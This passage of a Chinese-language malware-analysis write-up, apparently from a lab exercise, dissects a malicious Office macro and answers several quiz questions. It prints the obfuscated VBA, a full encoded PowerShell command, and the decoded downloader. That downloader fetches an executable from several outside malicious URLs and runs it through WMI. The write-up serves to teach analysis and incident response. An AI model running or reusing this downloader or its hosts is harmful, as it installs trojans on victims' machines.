+kRpYwyW = Replace$("f4�L5�JqZNvlk", "f4�L5�J", "TFRkfTygd")
+xve = Array _
+("1234444123", tiajriokchaoy. _
+Create(geulgelquuuj, kaenhaig, deavjoajsear), "9938723")
+Dim C0�jVh As Integer
+C0�jVh = 9
+Do While C0�jVh < 9 + 1
+C0�jVh = C0�jVh + 1: DoEvents
+Loop
+End Function
+Function juuvzouchmiopxeox(yiajthoavheiw)
+geutyoeytiestheug = yiajthoavheiw
+Dim QSuRcu As Currency
+feaxgeip = Split(geutyoeytiestheug, "2342772g3&*gs7712ffvs626fq")
+Dim J1�8�XwEwAd As String
+J1�8�XwEwAd = Replace$("UBZIWrn7�JAPVmt", "UBZI", "hsvq")
+jaquhoiqu = csqw + Join(feaxgeip, eihnx)
+Dim gBv As Object
+juuvzouchmiopxeox = jaquhoiqu
+Dim lqsqsHrCH As Boolean
+End Function
+Function geulgelquuuj()
+sjiqw = roubhaol.gaoddaicsauktheb.Pages(10 / 10).ControlTipText
+Dim ISXQDR As Integer
+ISXQDR = 2
+Do While ISXQDR < 2 + 7
+ISXQDR = ISXQDR + 9: DoEvents
+Loop
+geulgelquuuj = juuvzouchmiopxeox(sjiqw)
+Dim kbqvO4�7�r As Byte
+End Function
+Function luumlaud(zeolkaepxoag)
+Set luumlaud = CreateObject(zeolkaepxoag)
+Dim vPu As String
+vPu = Replace$("BenqV1�igVwifwdQq", "BenqV1�i", "on5�")
+luumlaud _
+. _
+showwindow = (mujgoiy + jioyseertioch) + (neivberziok + xuajroegquoudcaij)
+Dim osWIUnikOk As String
+osWIUnikOk = Replace$("cLwhWVLMDSQFh3�T7�", "cLwhWVLMDS", "AvYXNNS")
+End Function
+```
+
+​	相信你也看见了这句话：
+
+​	`feaxgeip = Split(geutyoeytiestheug, "2342772g3&*gs7712ffvs626fq")`
+
+​	这里就是用split函数，将我们刚刚讲的那个当逗号用的那个长字符串用来分隔字符串emm，那其实我们应该很早以前就发现答案了吧。。。哈哈拉着你们和我想这么久。
+
+​	Q7我们来看看吧，问我们Base64编码字符串执行的是什么程序？
+
+​	还记得上面那个玩意吗，就是我换成逗号的那个玩意，我们把那个字符串中逗号去掉
+
+```
+�powersheLL -e JABsAGkAZQBjAGgAcgBvAHUAaAB3AHUAdwA9ACcAdgB1AGEAYwBkAG8AdQB2AGMAaQBvAHgAaABhAG8AbAAnADsAWwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAIgBTAEUAYABjAHUAUgBpAFQAeQBgAFAAUgBPAGAAVABvAEMAYABvAGwAIgAgAD0AIAAnAHQAbABzADEAMgAsACAAdABsAHMAMQAxACwAIAB0AGwAcwAnADsAJABkAGUAaQBjAGgAYgBlAHUAZAByAGUAaQByACAAPQAgACcAMwAzADcAJwA7ACQAcQB1AG8AYQBkAGcAbwBpAGoAdgBlAHUAbQA9ACcAZAB1AHUAdgBtAG8AZQB6AGgAYQBpAHQAZwBvAGgAJwA7ACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAGQAZQBpAGMAaABiAGUAdQBkAHIAZQBpAHIAKwAnAC4AZQB4AGUAJwA7ACQAcwBpAGUAbgB0AGUAZQBkAD0AJwBxAHUAYQBpAG4AcQB1AGEAYwBoAGwAbwBhAHoAJwA7ACQAcgBlAHUAcwB0AGgAbwBhAHMAPQAuACgAJwBuACcAKwAnAGUAdwAtAG8AYgAnACsAJwBqAGUAYwB0ACcAKQAgAG4ARQB0AC4AdwBlAEIAYwBsAEkAZQBuAFQAOwAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQA9ACcAaAB0AHQAcABzADoALwAvAGgAYQBvAHEAdQBuAGsAbwBuAGcALgBjAG8AbQAvAGIAbgAvAHMAOQB3ADQAdABnAGMAagBsAF8AZgA2ADYANgA5AHUAZwB1AF8AdwA0AGIAagAvACoAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AdABlAGMAaAB0AHIAYQB2AGUAbAAuAGUAdgBlAG4AdABzAC8AaQBuAGYAbwByAG0AYQB0AGkAbwBuAGwALwA4AGwAcwBqAGgAcgBsADYAbgBuAGsAdwBnAHkAegBzAHUAZAB6AGEAbQBfAGgAMwB3AG4AZwBfAGEANgB2ADUALwAqAGgAdAB0AHAAOgAvAC8AZABpAGcAaQB3AGUAYgBtAGEAcgBrAGUAdABpAG4AZwAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8ANwAyAHQAMABqAGoAaABtAHYANwB0AGEAawB3AHYAaQBzAGYAbgB6AF8AZQBlAGoAdgBmAF8AaAA2AHYAMgBpAHgALwAqAGgAdAB0AHAAOgAvAC8AaABvAGwAZgB2AGUALgBzAGUALwBpAG0AYQBnAGUAcwAvADEAYwBrAHcANQBtAGoANAA5AHcAXwAyAGsAMQAxAHAAeABfAGQALwAqAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBjAGYAbQAuAG4AbAAvAF8AYgBhAGMAawB1AHAALwB5AGYAaAByAG0AaAA2AHUAMABoAGUAaQBkAG4AdwByAHUAdwBoAGEAMgB0ADQAbQBqAHoANgBwAF8AeQB4AGgAeQB1ADMAOQAwAGkANgBfAHEAOQAzAGgAawBoADMAZABkAG0ALwAnAC4AIgBzAGAAUABsAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAHMAZQBjAGMAaQBlAHIAZABlAGUAdABoAD0AJwBkAHUAdQB6AHkAZQBhAHcAcAB1AGEAcQB1ACcAOwBmAG8AcgBlAGEAYwBoACgAJABnAGUAZQByAHMAaQBlAGIAIABpAG4AIAAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQApAHsAdAByAHkAewAkAHIAZQB1AHMAdABoAG8AYQBzAC4AIgBkAE8AVwBOAGAAbABvAEEAYABkAGYAaQBgAEwAZQAiACgAJABnAGUAZQByAHMAaQBlAGIALAAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAYgB1AGgAeABlAHUAaAA9ACcAZABvAGUAeQBkAGUAaQBkAHEAdQBhAGkAagBsAGUAdQBjACcAOwBJAGYAIAAoACgALgAoACcARwBlAHQALQAnACsAJwBJAHQAZQAnACsAJwBtACcAKQAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQAuACIAbABgAGUATgBHAFQASAAiACAALQBnAGUAIAAyADQANwA1ADEAKQAgAHsAKABbAHcAbQBpAGMAbABhAHMAcwBdACcAdwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAnACkALgAiAEMAYABSAGUAYQBUAGUAIgAoACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAcQB1AG8AbwBkAHQAZQBlAGgAPQAnAGoAaQBhAGYAcgB1AHUAegBsAGEAbwBsAHQAaABvAGkAYwAnADsAYgByAGUAYQBrADsAJABjAGgAaQBnAGMAaABpAGUAbgB0AGUAaQBxAHUAPQAnAHkAbwBvAHcAdgBlAGkAaABuAGkAZQBqACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAHQAbwBpAHoAbAB1AHUAbABmAGkAZQByAD0AJwBmAG8AcQB1AGwAZQB2AGMAYQBvAGoAJwA=
+```
+
+​	最上面暴露了，这个就是执行的一个powershell程序（Q7答案），在这里具体就是长这个样子：
+
+```
+powershell.exe
+     │
+     └── -e
+          │
+          └── -EncodedCommand
+```
+
+​	是的，这剩下的base64就是这个encodedcommand，那我们不妨看看这些个玩意decode之后长什么样子：
+![image-20260821172751231](C:\Users\26388\AppData\Roaming\Typora\typora-user-images\image-20260821172751231.png)
+
+​	丑娃娃，我们用脚本处理一下：
+
+```
+import base64
+
+data = """YQBpAHQAZwBvAGgAJwA7ACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAPQAkAGUAbgB2ADoAdQBzAGUAcgBwAHIAbwBmAGkAbABlACsAJwBcACcAKwAkAGQAZQBpAGMAaABiAGUAdQBkAHIAZQBpAHIAKwAnAC4AZQB4AGUAJwA7ACQAcwBpAGUAbgB0AGUAZQBkAD0AJwBxAHUAYQBpAG4AcQB1AGEAYwBoAGwAbwBhAHoAJwA7ACQAcgBlAHUAcwB0AGgAbwBhAHMAPQAuACgAJwBuACcAKwAnAGUAdwAtAG8AYgAnACsAJwBqAGUAYwB0ACcAKQAgAG4ARQB0AC4AdwBlAEIAYwBsAEkAZQBuAFQAOwAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQA9ACcAaAB0AHQAcABzADoALwAvAGgAYQBvAHEAdQBuAGsAbwBuAGcALgBjAG8AbQAvAGIAbgAvAHMAOQB3ADQAdABnAGMAagBsAF8AZgA2ADYANgA5AHUAZwB1AF8AdwA0AGIAagAvACoAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AdABlAGMAaAB0AHIAYQB2AGUAbAAuAGUAdgBlAG4AdABzAC8AaQBuAGYAbwByAG0AYQB0AGkAbwBuAGwALwA4AGwAcwBqAGgAcgBsADYAbgBuAGsAdwBnAHkAegBzAHUAZAB6AGEAbQBfAGgAMwB3AG4AZwBfAGEANgB2ADUALwAqAGgAdAB0AHAAOgAvAC8AZABpAGcAaQB3AGUAYgBtAGEAcgBrAGUAdABpAG4AZwAuAGMAbwBtAC8AdwBwAC0AYQBkAG0AaQBuAC8ANwAyAHQAMABqAGoAaABtAHYANwB0AGEAawB3AHYAaQBzAGYAbgB6AF8AZQBlAGoAdgBmAF8AaAA2AHYAMgBpAHgALwAqAGgAdAB0AHAAOgAvAC8AaABvAGwAZgB2AGUALgBzAGUALwBpAG0AYQBnAGUAcwAvADEAYwBrAHcANQBtAGoANAA5AHcAXwAyAGsAMQAxAHAAeABfAGQALwAqAGgAdAB0AHAAOgAvAC8AdwB3AHcALgBjAGYAbQAuAG4AbAAvAF8AYgBhAGMAawB1AHAALwB5AGYAaAByAG0AaAA2AHUAMABoAGUAaQBkAG4AdwByAHUAdwBoAGEAMgB0ADQAbQBqAHoANgBwAF8AeQB4AGgAeQB1ADMAOQAwAGkANgBfAHEAOQAzAGgAawBoADMAZABkAG0ALwAnAC4AIgBzAGAAUABsAGkAVAAiACgAWwBjAGgAYQByAF0ANAAyACkAOwAkAHMAZQBjAGMAaQBlAHIAZABlAGUAdABoAD0AJwBkAHUAdQB6AHkAZQBhAHcAcAB1AGEAcQB1ACcAOwBmAG8AcgBlAGEAYwBoACgAJABnAGUAZQByAHMAaQBlAGIAIABpAG4AIAAkAGoAYQBjAGwAZQBlAHcAeQBpAHEAdQApAHsAdAByAHkAewAkAHIAZQB1AHMAdABoAG8AYQBzAC4AIgBkAE8AVwBOAGAAbABvAEEAYABkAGYAaQBgAEwAZQAiACgAJABnAGUAZQByAHMAaQBlAGIALAAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAYgB1AGgAeABlAHUAaAA9ACcAZABvAGUAeQBkAGUAaQBkAHEAdQBhAGkAagBsAGUAdQBjACcAOwBJAGYAIAAoACgALgAoACcARwBlAHQALQAnACsAJwBJAHQAZQAnACsAJwBtACcAKQAgACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQAuACIAbABgAGUATgBHAFQASAAiACAALQBnAGUAIAAyADQANwA1ADEAKQAgAHsAKABbAHcAbQBpAGMAbABhAHMAcwBdACcAdwBpAG4AMwAyAF8AUAByAG8AYwBlAHMAcwAnACkALgAiAEMAYABSAGUAYQBUAGUAIgAoACQAdABvAGUAaABmAGUAdABoAHgAbwBoAGIAYQBlAHkAKQA7ACQAcQB1AG8AbwBkAHQAZQBlAGgAPQAnAGoAaQBhAGYAcgB1AHUAegBsAGEAbwBsAHQAaABvAGkAYwAnADsAYgByAGUAYQBrADsAJABjAGgAaQBnAGMAaABpAGUAbgB0AGUAaQBxAHUAPQAnAHkAbwBvAHcAdgBlAGkAaABuAGkAZQBqACcAfQB9AGMAYQB0AGMAaAB7AH0AfQAkAHQAbwBpAHoAbAB1AHUAbABmAGkAZQByAD0AJwBmAG8AcQB1AGwAZQB2AGMAYQBvAGoAJwA="""
+
+data = "".join(data.split())
+
+decoded = base64.b64decode(data).decode("utf-16le")
+
+print(decoded)
+
+#output:aitgoh';$toehfethxohbaey=$env:userprofile+'\'+$deichbeudreir+'.exe';$sienteed='quainquachloaz';$reusthoas=.('n'+'ew-ob'+'ject') nEt.weBclIenT;$jacleewyiqu='https://haoqunkong.com/bn/s9w4tgcjl_f6669ugu_w4bj/*https://www.techtravel.events/informationl/8lsjhrl6nnkwgyzsudzam_h3wng_a6v5/*http://digiwebmarketing.com/wp-admin/72t0jjhmv7takwvisfnz_eejvf_h6v2ix/*http://holfve.se/images/1ckw5mj49w_2k11px_d/*http://www.cfm.nl/_backup/yfhrmh6u0heidnwruwha2t4mjz6p_yxhyu390i6_q93hkh3ddm/'."s`PliT"([char]42);$seccierdeeth='duuzyeawpuaqu';foreach($geersieb in $jacleewyiqu){try{$reusthoas."dOWN`loA`dfi`Le"($geersieb, $toehfethxohbaey);$buhxeuh='doeydeidquaijleuc';If ((.('Get-'+'Ite'+'m') $toehfethxohbaey)."l`eNGTH" -ge 24751) {([wmiclass]'win32_Process')."C`ReaTe"($toehfethxohbaey);$quoodteeh='jiafruuzlaolthoic';break;$chigchienteiqu='yoowveihniej'}}catch{}}$toizluulfier='foqulevcaoj'
+```
+
+​	这下好看多了(虽然还是丑娃娃)，不是吗，我都能从里面找到Q8的answer了。不知道你们有没有看见这里：
+
+​	`{([wmiclass]'win32_Process')."C`ReaTe"
+
+​	提取的内容显示，该脚本会动态构建有效载荷，下载后使用 WMI`Win32_Process`类执行。这种技术使攻击者能够隐蔽地启动木马程序，而无需依赖传统的进程执行方法，从而避免了被安全工具检测到的风险。
+
+​	Q8都出来了，Q9其实也在这里？
+
+​	问咱们的是什么？已尝试通过多个域名下载木马程序。请根据提示提供第一个完全限定域名 (FQDN)。
+
+​	依旧是看这里的我们的解码内容，头上这里有一个这个：`https://haoqunkong.com/bn/s9w4tgcjl_f6669ugu_w4bj`，该域名`haoqunkong.com`是脚本中引用的第一个完全限定域名 (FQDN)。脚本会构建并连接此 URL 以获取恶意载荷。URL 中使用 HTTPS 表明脚本试图加密传输，从而增加网络安全工具拦截和分析通信的难度。通过提取完全限定域名 (FQDN) `haoqunkong.com`，我们可以识别出此次攻击中用于分发木马程序的主要域名。该域名是攻击者基础设施的入口点，对于事件响应团队进行拦截和进一步调查至关重要。
+
+​	这下，我们的恶意office分析结束了。
+
+​	
